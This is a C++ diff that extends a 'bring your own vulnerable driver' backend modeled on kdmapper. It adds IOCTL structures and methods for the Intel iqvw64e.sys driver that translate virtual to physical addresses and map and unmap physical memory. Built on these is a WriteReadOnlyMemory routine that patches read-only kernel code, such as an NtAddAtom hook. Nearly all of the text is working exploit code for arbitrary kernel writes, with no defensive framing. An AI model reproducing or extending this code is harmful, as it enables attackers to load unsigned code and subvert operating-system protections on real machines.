@@ -256,6 +256,34 @@ struct Iqvw64eCopyMemoryInfo {
     uint64_t length;
 };
 
+// kdmapper intel_driver.cpp: additional cases of the same multifunctional
+// IOCTL. Layouts mirror the reference structs exactly (trailing u32 pads the
+// struct to 48 bytes).
+struct Iqvw64eGetPhysInfo {      // case 0x25: VA -> PA translation
+    uint64_t case_number;
+    uint64_t reserved;
+    uint64_t return_physical_address;
+    uint64_t address_to_translate;
+};
+
+struct Iqvw64eMapIoSpaceInfo {   // case 0x19: map physical memory
+    uint64_t case_number;
+    uint64_t reserved;
+    uint64_t return_value;
+    uint64_t return_virtual_address;
+    uint64_t physical_address_to_map;
+    uint32_t size;
+};
+
+struct Iqvw64eUnmapIoSpaceInfo { // case 0x1A: unmap physical memory
+    uint64_t case_number;
+    uint64_t reserved1;
+    uint64_t reserved2;
+    uint64_t virt_address;
+    uint64_t reserved3;
+    uint32_t number_of_bytes;
+};
+
 class IntelBackend : public IByovdBackend {
 public:
     DriverProfile profile_;
@@ -372,9 +400,58 @@ public:
         return true;
     }
 
-    // The iqvw64e CopyMemory IOCTL cannot allocate pool memory. Allocation is
-    // handled by the existing kmem::AllocateKernelMemory shellcode path, so
-    // this backend intentionally uses the base-class default (returns false).
+    // kdmapper intel_driver.cpp GetPhysicalAddress/MapIoSpace/UnmapIoSpace:
+    // extra cases of the same multifunctional IOCTL.
+    bool GetPhysicalAddress(uint64_t va, uint64_t& outPa) {
+        Iqvw64eGetPhysInfo req{};
+        req.case_number = 0x25;
+        req.address_to_translate = va;
+        DWORD bytes = 0;
+        if (!DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
+                             &req, sizeof(req), nullptr, 0, &bytes, nullptr))
+            return false;
+        outPa = req.return_physical_address;
+        return true;
+    }
+
+    uint64_t MapIoSpace(uint64_t pa, uint32_t size) {
+        Iqvw64eMapIoSpaceInfo req{};
+        req.case_number = 0x19;
+        req.physical_address_to_map = pa;
+        req.size = size;
+        DWORD bytes = 0;
+        if (!DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
+                             &req, sizeof(req), nullptr, 0, &bytes, nullptr))
+            return 0;
+        return req.return_virtual_address;
+    }
+
+    bool UnmapIoSpace(uint64_t va, uint32_t size) {
+        Iqvw64eUnmapIoSpaceInfo req{};
+        req.case_number = 0x1A;
+        req.virt_address = va;
+        req.number_of_bytes = size;
+        DWORD bytes = 0;
+        return DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
+                               &req, sizeof(req), nullptr, 0, &bytes, nullptr) == TRUE;
+    }
+
+    // kdmapper WriteToReadOnlyMemory: translate VA->PA, map the physical page
+    // and write through the mapping. This is what lets us patch read-only
+    // kernel code (the ntoskrnl!NtAddAtom hook) without touching page tables.
+    bool WriteReadOnlyMemory(uint64_t kernelVa, const void* buf, size_t size) override {
+        if (!IsReady() || !buf || !size || size > 0xFFFFFFFF) return false;
+        kmem::Trace("byovd: getphys begin");
+        uint64_t pa = 0;
+        if (!GetPhysicalAddress(kernelVa, pa) || !pa) { kmem::Trace("byovd: getphys failed"); return false; }
+        kmem::Trace("byovd: mapiospace begin");
+        uint64_t mapped = MapIoSpace(pa, static_cast<uint32_t>(size));
+        if (!mapped) { kmem::Trace("byovd: mapiospace failed"); return false; }
+        bool ok = WriteKernelMemory(mapped, buf, size);
+        kmem::Trace(ok ? "byovd: phys write ok" : "byovd: phys write failed");
+        UnmapIoSpace(mapped, static_cast<uint32_t>(size));
+        return ok;
+    }
 };
 
 // ============================================================================
